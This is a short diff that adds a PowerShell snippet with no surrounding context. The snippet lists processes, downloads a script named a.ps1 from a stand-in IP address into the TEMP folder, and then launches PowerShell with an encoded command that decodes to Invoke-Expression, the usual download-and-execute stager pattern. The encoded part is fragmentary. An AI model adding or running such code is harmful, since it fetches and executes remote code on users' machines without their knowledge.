@@ -1,0 +1,4 @@
+Get-Process
+Invoke-WebRequest `
+  -Uri http://192.0.2.4/a.ps1 -OutFile $env:TEMP\a.ps1
+powershell -enc SQBFAFgA
